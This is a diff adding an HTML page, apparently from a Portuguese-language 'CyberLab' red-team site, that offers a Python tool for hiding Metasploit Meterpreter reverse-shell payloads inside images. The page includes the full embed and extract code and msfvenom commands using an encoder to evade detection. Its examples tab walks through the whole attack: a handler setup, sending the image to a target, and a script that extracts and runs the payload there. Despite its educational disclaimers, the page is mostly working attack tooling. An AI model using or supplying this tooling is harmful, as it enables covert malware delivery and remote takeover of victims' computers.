@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Esteganografia com Metasploit - CyberLab</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/scripts.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <h1>CyberLab</h1>
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="/sobre">Sobre o Laboratório</a></li>
+                    <li><a href="/roadmap">Roadmap</a></li>
+                    <li><a href="/">Laboratórios</a></li>
+                    <li><a href="/scripts" class="active">Scripts</a></li>
+                    <li><a href="/vagas">Vagas</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="script-detail-banner">
+            <div class="container">
+                <div class="script-detail-header">
+                    <div class="script-detail-title">
+                        <h2>Esteganografia com Metasploit</h2>
+                        <div class="script-detail-meta">
+                            <div>
+                                <i class="fas fa-user-ninja"></i>
+                                <span>Red Team</span>
+                            </div>
+                            <div>
+                                <i class="fas fa-code-branch"></i>
+                                <span>Python</span>
+                            </div>
+                            <div>
+                                <i class="fas fa-level-up-alt"></i>
+                                <span>Avançado</span>
+                            </div>
+                            <div>
+                                <i class="fas fa-calendar-alt"></i>
+                                <span>Atualizado em: 15/03/2025</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="script-actions">
+                        <button class="script-action-btn">
+                            <i class="fas fa-bookmark"></i>
+                            Salvar
+                        </button>
+                        <button class="script-action-btn">
+                            <i class="fas fa-share-alt"></i>
+                            Compartilhar
+                        </button>
+                        <button class="script-action-btn download-btn">
+                            <i class="fas fa-download"></i>
+                            Download
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="disclaimer-box">
+                <div class="disclaimer-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="disclaimer-content">
+                    <h3>Aviso de Responsabilidade</h3>
+                    <p>Este script é fornecido exclusivamente para fins educacionais. O uso deste código deve ser restrito a ambientes controlados e com permissão explícita.</p>
+                    <p>A esteganografia pode ser utilizada para fins legítimos de pesquisa e proteção de dados, mas também pode ser mal utilizada. Use com responsabilidade.</p>
+                </div>
+            </div>
+
+            <div class="script-container">
+                <div class="script-main-content">
+                    <div class="script-tabs">
+                        <div class="script-tab active" data-tab="code">Código</div>
+                        <div class="script-tab" data-tab="documentation">Documentação</div>
+                        <div class="script-tab" data-tab="examples">Exemplos</div>
+                    </div>
+                    
+                    <div class="script-content-area">
+                        <!-- Aba de Código -->
+                        <div class="script-content-tab active" id="code-tab">
+                            <div class="code-container">
+                                <div class="code-header">
+                                    <div class="code-language">Python</div>
+                                    <div class="code-actions">
+                                        <button class="code-action-btn" title="Copiar Código">
+                                            <i class="fas fa-copy"></i>
+                                        </button>
+                                        <button class="code-action-btn" title="Expandir">
+                                            <i class="fas fa-expand"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="code-content">
+                                    <pre><code class="language-python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+# Nome: Esteganografia com Metasploit
+# Descrição: Script para embedding de payload Metasploit em imagens
+# Autor: CyberLab Team
+# Versão: 1.2
+# Data: 15/03/2025
+#
+# Uso: python3 metasploit_stego.py -i input.jpg -o output.jpg -p windows/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444
+
+import os
+import sys
+import argparse
+import subprocess
+import tempfile
+from PIL import Image
+import numpy as np
+import random
+import struct
+import logging
+
+# Configuração de logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+class MetasploitSteganography:
+    """Classe para implementação de esteganografia com Metasploit payloads"""
+    
+    def __init__(self, input_image, output_image, payload, lhost, lport, encoder=None):
+        """Inicializa a classe com os parâmetros necessários
+        
+        Args:
+            input_image (str): Caminho para a imagem de entrada
+            output_image (str): Caminho para a imagem de saída
+            payload (str): Payload Metasploit a ser usado
+            lhost (str): IP do host de escuta
+            lport (int): Porta de escuta
+            encoder (str, optional): Encoder para o payload. Default None.
+        """
+        self.input_image = input_image
+        self.output_image = output_image
+        self.payload = payload
+        self.lhost = lhost
+        self.lport = lport
+        self.encoder = encoder
+        self.temp_dir = tempfile.mkdtemp()
+        self.payload_file = os.path.join(self.temp_dir, "payload.bin")
+        
+        # Verificar se a imagem de entrada existe
+        if not os.path.exists(self.input_image):
+            logger.error(f"Arquivo de imagem não encontrado: {self.input_image}")
+            sys.exit(1)
+            
+        # Verificar se o Metasploit está instalado
+        try:
+            subprocess.run(['msfvenom', '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+        except (subprocess.SubprocessError, FileNotFoundError):
+            logger.error("Metasploit Framework (msfvenom) não encontrado. Instale-o primeiro.")
+            sys.exit(1)
+    
+    def generate_payload(self):
+        """Gera o payload Metasploit usando msfvenom
+        
+        Returns:
+            bool: True se o payload foi gerado com sucesso, False caso contrário
+        """
+        logger.info(f"Gerando payload {self.payload} com LHOST={self.lhost} e LPORT={self.lport}")
+        
+        cmd = [
+            'msfvenom',
+            '-p', self.payload,
+            'LHOST=' + self.lhost,
+            'LPORT=' + str(self.lport),
+            '-f', 'raw',
+            '-o', self.payload_file
+        ]
+        
+        if self.encoder:
+            cmd.extend(['-e', self.encoder])
+        
+        try:
+            process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+            logger.info("Payload gerado com sucesso")
+            return True
+        except subprocess.CalledProcessError as e:
+            logger.error(f"Erro ao gerar payload: {e.stderr.decode()}")
+            return False
+    
+    def embed_payload(self):
+        """Embeda o payload na imagem usando técnicas de esteganografia LSB
+        
+        Returns:
+            bool: True se o payload foi embutido com sucesso, False caso contrário
+        """
+        try:
+            # Gerar o payload primeiro
+            if not self.generate_payload():
+                return False
+            
+            # Carregar a imagem
+            logger.info(f"Abrindo imagem de entrada: {self.input_image}")
+            img = Image.open(self.input_image)
+            img_array = np.array(img)
+            
+            # Carregar o payload binário
+            with open(self.payload_file, 'rb') as f:
+                payload_data = f.read()
+            
+            # Verificar se a imagem é grande o suficiente para o payload
+            payload_size = len(payload_data)
+            max_bytes = img_array.size // 8  # Cada byte requer 8 pixels para LSB
+            
+            if payload_size > max_bytes:
+                logger.error(f"Imagem muito pequena para o payload. Necessário: {payload_size} bytes, Disponível: {max_bytes} bytes")
+                return False
+            
+            logger.info(f"Tamanho do payload: {payload_size} bytes")
+            
+            # Preparar cabeçalho com tamanho do payload
+            header = struct.pack(">I", payload_size)
+            data_to_hide = header + payload_data
+            
+            # Converter dados para bits
+            bits = []
+            for byte in data_to_hide:
+                for i in range(8):
+                    bits.append((byte >> i) & 1)
+            
+            # Achatando o array para manipulação mais fácil
+            flat_img = img_array.flatten()
+            
+            # Incorporar os bits nos LSBs da imagem
+            for i, bit in enumerate(bits):
+                if i >= len(flat_img):
+                    break
+                flat_img[i] = (flat_img[i] & ~1) | bit
+            
+            # Reformatar e salvar a imagem
+            modified_img_array = flat_img.reshape(img_array.shape)
+            modified_img = Image.fromarray(modified_img_array)
+            modified_img.save(self.output_image)
+            
+            logger.info(f"Payload incorporado com sucesso. Imagem salva como: {self.output_image}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Erro ao incorporar payload na imagem: {str(e)}")
+            return False
+        finally:
+            # Limpar arquivos temporários
+            if os.path.exists(self.payload_file):
+                os.remove(self.payload_file)
+            os.rmdir(self.temp_dir)
+    
+    @staticmethod
+    def extract_payload(stego_image, output_file):
+        """Extrai o payload de uma imagem esteganográfica
+        
+        Args:
+            stego_image (str): Caminho para a imagem com o payload
+            output_file (str): Caminho para salvar o payload extraído
+            
+        Returns:
+            bool: True se o payload foi extraído com sucesso, False caso contrário
+        """
+        try:
+            # Carregar a imagem
+            logger.info(f"Abrindo imagem esteganográfica: {stego_image}")
+            img = Image.open(stego_image)
+            img_array = np.array(img)
+            
+            # Achatar o array
+            flat_img = img_array.flatten()
+            
+            # Extrair os bits dos LSBs
+            extracted_bits = []
+            for i in range(len(flat_img)):
+                extracted_bits.append(flat_img[i] & 1)
+            
+            # Converter bits para bytes
+            extracted_bytes = bytearray()
+            for i in range(0, len(extracted_bits), 8):
+                if i + 8 > len(extracted_bits):
+                    break
+                byte = 0
+                for j in range(8):
+                    byte |= extracted_bits[i + j] << j
+                extracted_bytes.append(byte)
+            
+            # Ler o cabeçalho para obter o tamanho do payload
+            payload_size = struct.unpack(">I", extracted_bytes[:4])[0]
+            
+            # Verificar se temos bytes suficientes
+            if payload_size + 4 > len(extracted_bytes):
+                logger.error(f"Dados incompletos. Esperado: {payload_size + 4} bytes, Disponível: {len(extracted_bytes)} bytes")
+                return False
+            
+            # Extrair apenas o payload
+            payload_data = extracted_bytes[4:4+payload_size]
+            
+            # Salvar o payload
+            with open(output_file, 'wb') as f:
+                f.write(payload_data)
+            
+            logger.info(f"Payload extraído com sucesso. Salvo como: {output_file}")
+            return True
+            
+        except Exception as e:
+            logger.error(f"Erro ao extrair payload da imagem: {str(e)}")
+            return False
+
+def parse_arguments():
+    """Analisa os argumentos da linha de comando
+    
+    Returns:
+    argparse.Namespace: Namespace contendo os argumentos analisados
+    """
+    parser = argparse.ArgumentParser(description='Ferramenta de esteganografia com Metasploit')
+    
+    parser.add_argument('-i', '--input', dest='input_image', required=True,
+                        help='Caminho para a imagem de entrada')
+    
+    parser.add_argument('-o', '--output', dest='output_image', required=True,
+                        help='Caminho para a imagem de saída')
+    
+    parser.add_argument('-p', '--payload', dest='payload', required=True,
+                        help='Payload Metasploit a ser usado (ex: windows/meterpreter/reverse_tcp)')
+    
+    parser.add_argument('-lhost', dest='lhost', required=True,
+                        help='IP do host de escuta')
+    
+    parser.add_argument('-lport', dest='lport', required=True, type=int,
+                        help='Porta de escuta')
+    
+    parser.add_argument('-e', '--encoder', dest='encoder',
+                        help='Encoder a ser usado (ex: x86/shikata_ga_nai)')
+    
+    parser.add_argument('-x', '--extract', dest='extract', action='store_true',
+                        help='Extrair payload de uma imagem (use -i para imagem e -o para payload)')
+    
+    parser.add_argument('-v', '--verbose', dest='verbose', action='store_true',
+                        help='Aumentar verbosidade de logs')
+    
+    return parser.parse_args()
+
+def main():
+    """Função principal"""
+    args = parse_arguments()
+    
+    # Configurar nível de log
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+    
+    if args.extract:
+        # Modo de extração
+        if not MetasploitSteganography.extract_payload(args.input_image, args.output_image):
+            logger.error("Falha ao extrair payload")
+            sys.exit(1)
+    else:
+        # Modo de incorporação
+        stego = MetasploitSteganography(
+            args.input_image,
+            args.output_image,
+            args.payload,
+            args.lhost,
+            args.lport,
+            args.encoder
+        )
+        
+        if not stego.embed_payload():
+            logger.error("Falha ao incorporar payload na imagem")
+            sys.exit(1)
+    
+    sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Aba de Documentação -->
+                        <div class="script-content-tab" id="documentation-tab">
+                            <div class="doc-section">
+                                <h3>Visão Geral</h3>
+                                <p>Esta ferramenta permite incorporar payloads do Metasploit Framework em imagens usando técnicas de esteganografia. A esteganografia é a arte e ciência de esconder informações dentro de outras informações de forma que seja imperceptível para observadores casuais.</p>
+                                
+                                <p>A ferramenta utiliza a técnica LSB (Least Significant Bit), que altera o bit menos significativo de cada pixel de uma imagem para armazenar os dados do payload. Esta alteração é imperceptível ao olho humano, mas permite que uma quantidade significativa de dados seja escondida na imagem.</p>
+                                
+                                <h4>Requisitos</h4>
+                                <ul>
+                                    <li>Python 3.6+</li>
+                                    <li>Metasploit Framework instalado (msfvenom)</li>
+                                    <li>Bibliotecas Python: PIL (Pillow), NumPy</li>
+                                </ul>
+                                
+                                <h4>Instalação das Dependências</h4>
+                                <div class="code-block">
+                                    <pre><code class="language-bash">pip install pillow numpy</code></pre>
+                                </div>
+                                
+                                <h3>Funcionalidades</h3>
+                                <ul>
+                                    <li>Geração de payloads Metasploit customizados</li>
+                                    <li>Incorporação de payloads em imagens usando esteganografia LSB</li>
+                                    <li>Extração de payloads de imagens esteganográficas</li>
+                                    <li>Suporte a diferentes formatos de imagem (JPG, PNG, BMP, etc.)</li>
+                                    <li>Verificação de capacidade da imagem para o tamanho do payload</li>
+                                </ul>
+                                
+                                <h3>Uso</h3>
+                                <h4>Incorporar Payload em Imagem</h4>
+                                <div class="code-block">
+                                    <pre><code class="language-bash">python metasploit_stego.py -i input.jpg -o output.jpg -p windows/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444</code></pre>
+                                </div>
+                                
+                                <h4>Extrair Payload de Imagem</h4>
+                                <div class="code-block">
+                                    <pre><code class="language-bash">python metasploit_stego.py -x -i stego_image.jpg -o extracted_payload.bin</code></pre>
+                                </div>
+                                
+                                <h4>Usar Encoder Específico</h4>
+                                <div class="code-block">
+                                    <pre><code class="language-bash">python metasploit_stego.py -i input.jpg -o output.jpg -p windows/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444 -e x86/shikata_ga_nai</code></pre>
+                                </div>
+                                
+                                <h3>Parâmetros</h3>
+                                <ul>
+                                    <li><code>-i, --input</code>: Caminho para a imagem de entrada</li>
+                                    <li><code>-o, --output</code>: Caminho para a imagem de saída (ou payload extraído)</li>
+                                    <li><code>-p, --payload</code>: Payload Metasploit a ser usado</li>
+                                    <li><code>-lhost</code>: IP do host de escuta</li>
+                                    <li><code>-lport</code>: Porta de escuta</li>
+                                    <li><code>-e, --encoder</code>: Encoder a ser usado (opcional)</li>
+                                    <li><code>-x, --extract</code>: Extrair payload de uma imagem</li>
+                                    <li><code>-v, --verbose</code>: Aumentar verbosidade de logs</li>
+                                </ul>
+                                
+                                <h3>Limitações</h3>
+                                <ul>
+                                    <li>O tamanho do payload está limitado ao tamanho da imagem (cada byte do payload requer 8 pixels)</li>
+                                    <li>Formatos com alta compressão como JPEG podem corromper os dados escondidos</li>
+                                    <li>A técnica não é resistente a manipulações da imagem (recorte, redimensionamento, etc.)</li>
+                                </ul>
+                                
+                                <h3>Considerações de Segurança</h3>
+                                <p>Esta ferramenta foi desenvolvida para fins educacionais e de pesquisa. A esteganografia pode ser usada para fins legítimos, como marca d'água digital, mas também pode ser mal utilizada. Utilize-a de forma ética e responsável, apenas em ambientes controlados e com permissão adequada.</p>
+                            </div>
+                        </div>
+                        
+                        <!-- Aba de Exemplos -->
+                        <div class="script-content-tab" id="examples-tab">
+                            <div class="doc-section">
+                                <h3>Exemplos de Uso</h3>
+                                
+                                <h4>Exemplo 1: Payload Windows para Meterpreter</h4>
+                                <p>Neste exemplo, incorporamos um payload Meterpreter para Windows em uma imagem JPG:</p>
+                                
+                                <div class="doc-example">
+                                    <h5>Passo 1: Preparar o handler no Metasploit</h5>
+                                    <p>Primeiro, configure o listener no Metasploit para receber a conexão:</p>
+                                    <pre><code class="language-bash">msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit -j</code></pre>
+                                    
+                                    <h5>Passo 2: Gerar a imagem esteganográfica</h5>
+                                    <p>Agora, use o script para incorporar o payload na imagem:</p>
+                                    <pre><code class="language-bash">python metasploit_stego.py -i beach.jpg -o beach_hidden.jpg -p windows/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444</code></pre>
+                                    
+                                    <h5>Passo 3: Usar a imagem</h5>
+                                    <p>A imagem gerada pode ser enviada para o alvo. Quando a imagem for processada por um script de extração do payload (que você também deve fornecer), o Meterpreter será executado e se conectará de volta ao seu handler.</p>
+                                </div>
+                                
+                                <h4>Exemplo 2: Payload Linux com Encoder</h4>
+                                <p>Este exemplo mostra como usar um encoder para ofuscar o payload e evitar detecção:</p>
+                                
+                                <div class="doc-example">
+                                    <pre><code class="language-bash">python metasploit_stego.py -i logo.png -o logo_hidden.png -p linux/x86/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 5555 -e x86/shikata_ga_nai</code></pre>
+                                </div>
+                                
+                                <h4>Exemplo 3: Extrair Payload de uma Imagem</h4>
+                                <p>Se você recebeu uma imagem com um payload escondido, pode extraí-lo assim:</p>
+                                
+                                <div class="doc-example">
+                                    <pre><code class="language-bash">python metasploit_stego.py -x -i suspicious_image.png -o extracted_payload.bin</code></pre>
+                                    <p>O arquivo <code>extracted_payload.bin</code> conterá o payload extraído, que pode ser analisado para determinar sua funcionalidade.</p>
+                                </div>
+                                
+                                <h4>Exemplo 4: Incorporação e Execução Completa</h4>
+                                <p>Exemplo completo de workflow, desde a criação até a execução do payload:</p>
+                                
+                                <div class="doc-example">
+                                    <h5>No sistema atacante:</h5>
+                                    <pre><code class="language-bash"># 1. Criar a imagem esteganográfica
+python metasploit_stego.py -i cat.jpg -o cat_cute.jpg -p windows/meterpreter/reverse_tcp -lhost 192.168.1.100 -lport 4444
+
+# 2. Configurar o listener
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit -j"</code></pre>
+                                    
+                                    <h5>No sistema alvo (com um script de extração e execução):</h5>
+                                    <pre><code class="language-python"># extract_and_run.py
+import subprocess
+from metasploit_stego import MetasploitSteganography
+
+# Extrair payload
+MetasploitSteganography.extract_payload("cat_cute.jpg", "payload.bin")
+
+# Executar payload
+subprocess.Popen(["payload.bin"], shell=True)</code></pre>
+                                </div>
+                                
+                                <h3>Casos de Uso</h3>
+                                <ul>
+                                    <li><strong>Testes de Penetração:</strong> Bypass de controles de segurança que não inspecionam imagens.</li>
+                                    <li><strong>Pesquisa de Segurança:</strong> Estudo de técnicas de esteganografia para desenvolver melhores métodos de detecção.</li>
+                                    <li><strong>Educação:</strong> Demonstração das capacidades e limitações da esteganografia em contextos de segurança.</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="script-sidebar">
+                    <div class="script-info">
+                        <h3>Informações</h3>
+                        <div class="info-list">
+                            <div class="info-item">
+                                <div class="info-label">Autor:</div>
+                                <div class="info-value">CyberLab Team</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Versão:</div>
+                                <div class="info-value">1.2</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Atualizado:</div>
+                                <div class="info-value">15/03/2025</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Licença:</div>
+                                <div class="info-value">MIT</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Compatibilidade:</div>
+                                <div class="info-value">Python 3.6+</div>
+                            </div>
+                            <div class="info-item">
+                                <div class="info-label">Dependências:</div>
+                                <div class="info-value">Metasploit, Pillow, NumPy</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="related-scripts-panel">
+                        <h3>Scripts Relacionados</h3>
+                        <div class="related-scripts">
+                            <div class="related-script-item">
+                                <span class="related-script-tag red-team">Red Team</span>
+                                <a href="/scripts/red-team/process-injection">Process Injection Techniques</a>
+                            </div>
+                            <div class="related-script-item">
+                                <span class="related-script-tag red-team">Red Team</span>
+                                <a href="/scripts/red-team/metasploit-resource">Metasploit Resource Script</a>
+                            </div>
+                            <div class="related-script-item">
+                                <span class="related-script-tag crypto">Criptografia</span>
+                                <a href="/scripts/crypto/hash-analyzer">Análise de Hash</a>
+                            </div>
+                            <div class="related-script-item">
+                                <span class="related-script-tag malware">Malware</span>
+                                <a href="/scripts/malware/automated-sandbox">Sandbox Automatizado</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 CyberLab - Laboratório de Cyber Segurança</p>
+        </div>
+    </footer>
+
+    <script>
+        // Garantir que a página carregue no topo
+        window.scrollTo(0, 0);
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configurar tabs
+            const tabs = document.querySelectorAll('.script-tab');
+            const contentTabs = document.querySelectorAll('.script-content-tab');
+            
+            tabs.forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabType = this.getAttribute('data-tab');
+                    
+                    // Remover classe ativa de todas as tabs
+                    tabs.forEach(t => t.classList.remove('active'));
+                    contentTabs.forEach(c => c.classList.remove('active'));
+                    
+                    // Adicionar classe ativa à tab clicada
+                    this.classList.add('active');
+                    document.getElementById(tabType + '-tab').classList.add('active');
+                });
+            });
+            
+            // Configurar botão de cópia de código
+            const copyBtn = document.querySelector('.code-action-btn[title="Copiar Código"]');
+            if (copyBtn) {
+                copyBtn.addEventListener('click', function() {
+                    // Obter código
+                    const codeElement = document.querySelector('.code-content code');
+                    const codeText = codeElement.textContent;
+                    
+                    // Copiar para clipboard
+                    navigator.clipboard.writeText(codeText).then(() => {
+                        // Feedback visual
+                        const icon = this.querySelector('i');
+                        const originalClass = icon.className;
+                        
+                        icon.className = 'fas fa-check';
+                        setTimeout(() => {
+                            icon.className = originalClass;
+                        }, 2000);
+                    });
+                });
+            }
+        });
+    </script>
+</body>
+</html>
